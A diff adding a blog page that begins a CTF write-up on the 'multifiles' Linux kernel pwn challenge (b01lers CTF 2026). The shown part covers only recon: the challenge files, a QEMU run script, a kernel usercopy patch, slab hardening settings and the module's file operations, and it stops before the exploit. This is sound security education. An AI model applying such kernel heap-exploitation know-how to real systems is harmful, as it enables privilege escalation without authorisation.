@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>b01lers ctf 2026: kernel pwn (part 2) | </title>
+<meta name="title" content="b01lers ctf 2026: kernel pwn (part 2)" />
+<meta name="description" content="Writeup for kernel pwn challenge from b01lers ctf 2026." />
+<meta name="keywords" content="kernel,pwn," />
+
+
+<meta property="og:url" content="http://localhost:1313/blog/multifiles/">
+	<meta property="og:title" content="b01lers ctf 2026: kernel pwn (part 2)">
+	<meta property="og:description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+	<meta property="og:locale" content="en_US">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="blog">
+		<meta property="article:published_time" content="2026-05-18T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-05-18T00:00:00+00:00">
+		<meta property="article:tag" content="Kernel">
+		<meta property="article:tag" content="Pwn">
+		<meta property="og:image" content="http://localhost:1313/images/share.png">
+
+
+
+
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="http://localhost:1313/images/share.png">
+	<meta name="twitter:title" content="b01lers ctf 2026: kernel pwn (part 2)">
+	<meta name="twitter:description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+
+
+
+
+	<meta itemprop="name" content="b01lers ctf 2026: kernel pwn (part 2)">
+	<meta itemprop="description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
+	<meta itemprop="datePublished" content="2026-05-18T00:00:00+00:00">
+	<meta itemprop="dateModified" content="2026-05-18T00:00:00+00:00">
+	<meta itemprop="wordCount" content="5324">
+	<meta itemprop="image" content="http://localhost:1313/images/share.png">
+	<meta itemprop="keywords" content="Kernel,Pwn">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+    --width: 720px;
+    --font-main: Verdana, sans-serif;
+    --font-secondary: Verdana, sans-serif;
+    --font-scale: 1em;
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --background-color: #01242e;
+      --heading-color: #eee;
+      --text-color: #ddd;
+      --link-color: #8cc2dd;
+      --visited-color: #8b6fcb;
+      --blockquote-color: #ccc;
+    }
+  }
+
+  body {
+    font-family: var(--font-secondary);
+    font-size: var(--font-scale);
+    margin: auto;
+    padding: 20px;
+    max-width: var(--width);
+    text-align: left;
+    background-color: var(--background-color);
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: var(--text-color);
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    font-family: var(--font-main);
+    color: var(--heading-color);
+  }
+
+  a {
+    color: var(--link-color);
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  nav a {
+    margin-right: 8px;
+  }
+
+  strong,
+  b {
+    color: var(--heading-color);
+  }
+
+  button {
+    margin: 0;
+    cursor: pointer;
+  }
+
+  time {
+    font-family: monospace;
+    font-style: normal;
+    font-size: 15px;
+  }
+
+  main {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  hr {
+    border: 0;
+    border-top: 1px dashed;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    font-family: monospace;
+    padding: 2px;
+    border-radius: 3px;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: var(--blockquote-color);
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px 0;
+    text-align: center;
+  }
+
+  .title:hover {
+    text-decoration: none;
+  }
+
+  .title h1 {
+    font-size: 1.5em;
+  }
+
+  .inline {
+    width: auto !important;
+  }
+
+  .highlight,
+  .code {
+    border-radius: 3px;
+    margin-block-start: 1em;
+    margin-block-end: 1em;
+    overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: var(--visited-color);
+  }
+
+</style>
+<style>
+  .rss-link {
+    display: inline-flex;
+    align-items: center;
+    color: inherit;
+    line-height: 1;
+    vertical-align: text-bottom;
+  }
+
+  .rss-link:hover {
+    text-decoration: none;
+  }
+
+  .rss-link .svg-icon {
+    width: 1rem;
+    height: 1rem;
+    fill: currentColor;
+    flex: none;
+  }
+
+  .rss-link .svg-icon.orange {
+    color: #f28c28;
+  }
+
+  .rss-link:hover .svg-icon.orange {
+    color: #e67900;
+  }
+</style>
+
+<style>
+   
+  .highlight, .code {
+    overflow-x: auto;
+    display: block;
+    width: 100%;
+  }
+
+  .highlight pre, .code pre {
+    width: max-content;
+    min-width: 100%;
+    margin: 0;
+  }
+     
+  img {
+    max-width: 100%;
+    height: auto;
+  }
+
+   
+  table {
+    display: block;
+    width: 100%;
+    overflow-x: auto;
+  }
+</style>
+
+<script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t)})();</script>
+
+<style>
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --text-color: #f0f0f0;
+      --heading-color: #fff;
+      --blockquote-color: #e8e8e8;
+    }
+  }
+
+  html[data-theme="dark"] {
+    --background-color: #01242e;
+    --heading-color: #fff;
+    --text-color: #f0f0f0;
+    --link-color: #8cc2dd;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #e8e8e8;
+  }
+
+  html[data-theme="light"] {
+    --background-color: #fff;
+    --heading-color: #222;
+    --text-color: #444;
+    --link-color: #3273dc;
+    --visited-color: #8b6fcb;
+    --blockquote-color: #222;
+  }
+
+  #theme-toggle {
+    position: fixed;
+    top: 1rem;
+    right: 1rem;
+    background: none;
+    border: 1px solid currentColor;
+    border-radius: 4px;
+    padding: 0.25rem 0.5rem;
+    cursor: pointer;
+    font-size: 1rem;
+    color: inherit;
+    opacity: 0.55;
+    z-index: 100;
+    line-height: 1;
+  }
+
+  #theme-toggle:hover {
+    opacity: 1;
+  }
+</style>
+
+<script data-goatcounter="https://goaticctx.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2></h2>
+</a>
+<nav>
+<a href="/">Home</a>
+
+<a href="/blog/">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>b01lers ctf 2026: kernel pwn (part 2)</h1>
+<p>
+  <i>
+    <time datetime='2026-05-18'>
+      18 May, 2026
+    </time>
+  </i>
+</p>
+
+<content>
+  <h1 id="intro">Intro</h1>
+<p>Previously I wrote a writeup on the first kernel challenge from this CTF — if you haven&rsquo;t read it yet, I recommend starting with <a href="https://icctx.xyz/blog/throughthewall/">Part 1</a>.</p>
+<p>This post covers <strong>multifiles</strong>, the second kernel pwn challenge.</p>
+<p>Since I&rsquo;m releasing this writeup a bit late: in Part 1, to cover all the steps required for exploitation, I reimplemented the exploit from scratch in Rust. This time around, given the delay, you&rsquo;ll get a refactored version of the original exploit in C instead.</p>
+<h1 id="multifiles">multifiles</h1>
+<p><a href="https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/multifiles/multifiles.tar.gz">download</a></p>
+<h2 id="recon">Recon</h2>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>├── build_out
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>│   ├── bzImage
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>│   ├── initrd.cpio.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>│   ├── kernel.config
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>│   ├── multifiles.ko
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>│   └── System.map
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>├── deploy
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>│   ├── docker-compose.prod.yml
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>│   ├── docker-compose.yml
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>│   ├── Dockerfile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>│   ├── Dockerfile_build
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>│   └── wrapper.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>├── dev.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>├── pwn_build.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span>├── README.md
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span>└── src
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span>    ├── drop_priv.c
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">19</span><span>    ├── initrd_init
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">20</span><span>    ├── kernel-cache-usercopy.diff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">21</span><span>    ├── kernel.config.fragment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">22</span><span>    ├── Makefile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">23</span><span>    └── multifiles.c
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">25</span><span><span style="color:#d19a66">4</span> directories, <span style="color:#d19a66">19</span> files
+</span></span></code></pre></div><p>README.md</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Markdown" data-lang="Markdown"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span># multifiles
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span>build artifacts in <span style="color:#98c379">`build_out/`</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span>rebuild with <span style="color:#98c379">`pwn_build.sh`</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">7</span><span>run challenge with <span style="color:#98c379">`dev.sh`</span>
+</span></span></code></pre></div><p>Based on <code>deploy/wrapper.sh</code>, I assembled a local run script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#7f848e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span>qemu-system-x86_64 <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span>   -nodefaults -m 256M -nographic <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span>   -kernel ~/multifiles/build_out/bzImage <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span>   -initrd ~/multifiles/build_out/initrd.cpio.gz <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span>   -append <span style="color:#98c379">&#34;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&#34;</span> <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">7</span><span>   -cpu qemu64,+smep,+smap <span style="color:#98c379">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">8</span><span>   -smp <span style="color:#d19a66">1</span> -no-reboot -serial stdio -monitor none
+</span></span></code></pre></div><p>The VM boots successfully.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#56b6c2">[</span>multifiles<span style="color:#56b6c2">]</span> booting challenge <span style="color:#e06c75">initrd</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#56b6c2">==============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span> multifiles kernel <span style="color:#e06c75">challenge</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span><span style="color:#56b6c2">==============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>Device: /dev/multifiles
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>Flag:   /root/flag.txt <span style="color:#56b6c2">(</span>root only<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>User:   ctf <span style="color:#56b6c2">(</span><span style="color:#e06c75">uid</span><span style="color:#56b6c2">=</span>1000<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#56b6c2">==============================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>BusyBox v1.35.0 <span style="color:#56b6c2">(</span>Debian 1:1.35.0-4+b7<span style="color:#56b6c2">)</span> built-in shell <span style="color:#56b6c2">(</span>ash<span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>Enter <span style="color:#98c379">&#39;help&#39;</span> <span style="color:#c678dd">for</span> a list of built-in commands.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>sh: can&#39;t access tty; job control turned off
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>~ $ 
+</span></span></code></pre></div><h2 id="read-sources">Read sources</h2>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span>src
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span>├── drop_priv.c
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">3</span><span>├── initrd_init
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">4</span><span>├── kernel-cache-usercopy.diff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">5</span><span>├── kernel.config.fragment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">6</span><span>├── Makefile
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">7</span><span>└── multifiles.c
+</span></span></code></pre></div><p><code>drop_priv</code> and <code>initrd_init</code> follow the same pattern as Part 1.
+Here we have a target kernel module and a small patch to the kernel itself.</p>
+<p>Let&rsquo;s go through the interesting source files.</p>
+<p><code>kernel-cache-usercopy.diff</code> adds <code>kmem_cache_copy_from_user</code> / <code>kmem_cache_copy_to_user</code> — wrappers around <code>copy_from/to_user</code> that first verify the destination/source object belongs to a specific slab cache before performing the copy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#98c379;font-weight:bold">+/**
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span><span style="color:#98c379;font-weight:bold">+ * kmem_cache_copy_from_user - Copy from userspace into an object from a cache
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#98c379;font-weight:bold">+ * @cachep: The cache the destination object must belong to.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span><span style="color:#98c379;font-weight:bold">+ * @to: Destination address in kernel memory.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span><span style="color:#98c379;font-weight:bold">+ * @from: Source address in userspace.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span><span style="color:#98c379;font-weight:bold">+ * @n: Number of bytes to copy.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span><span style="color:#98c379;font-weight:bold">+ *
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#98c379;font-weight:bold">+ * This wraps copy_from_user(), but first verifies that @to lives in a slab
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span><span style="color:#98c379;font-weight:bold">+ * belonging to @cachep. The subsequent copy_from_user() call performs the
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span><span style="color:#98c379;font-weight:bold">+ * normal hardened usercopy heap validation for the destination range.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span><span style="color:#98c379;font-weight:bold">+ *
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span><span style="color:#98c379;font-weight:bold">+ * Return: number of bytes not copied, like copy_from_user().
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span><span style="color:#98c379;font-weight:bold">+ */
+</span></span></span></code></pre></div><p>From <code>kernel.config.fragment</code>, note the slab configuration:</p>
+<pre tabindex="0"><code>CONFIG_SLAB_FREELIST_HARDENED=y
+CONFIG_SLAB_FREELIST_RANDOM=n
+</code></pre><p><code>FREELIST_HARDENED</code> encodes freelist pointers (<code>next ^ secret ^ bswap64(slot_addr)</code>), making them not trivially readable. <code>FREELIST_RANDOM=n</code> means the freelist order within a slab page is deterministic — useful for reliable object placement. If this is unfamiliar, <a href="https://samsung.github.io/kspp-study/heap-ovfl.html#protecting-the-integrity-of-heap-metadata">this article</a> is a good reference.</p>
+<p><code>multifiles.c</code>: the <code>init</code> and <code>exit</code> functions are standard boilerplate. The interesting part is the <code>file_operations</code> table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#c678dd">static</span> <span style="color:#c678dd">const</span> <span style="color:#c678dd">struct</span> <span style="color:#e06c75">file_operations</span> <span style="color:#e06c75">multifiles_fops</span> <span style="color:#56b6c2">=</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>    .<span style="color:#e06c75">owner</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">THIS_MODULE</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>    .<span style="color:#e06c75">open</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_open</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>    .<span style="color:#e06c75">release</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_release</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>    .<span style="color:#e06c75">read</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_read</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>    .<span style="color:#e06c75">write</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_write</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>    .<span style="color:#e06c75">llseek</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_llseek</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>    .<span style="color:#e06c75">unlocked_ioctl</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_ioctl</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>    <span style="color:#7f848e">#ifdef CONFIG_COMPAT
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>    .<span style="color:#e06c75">compat_ioctl</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">multifiles_ioctl</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>    <span style="color:#7f848e">#endif
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>};
+</span></span></code></pre></div><p>Now the data structures the module operates on:</p>
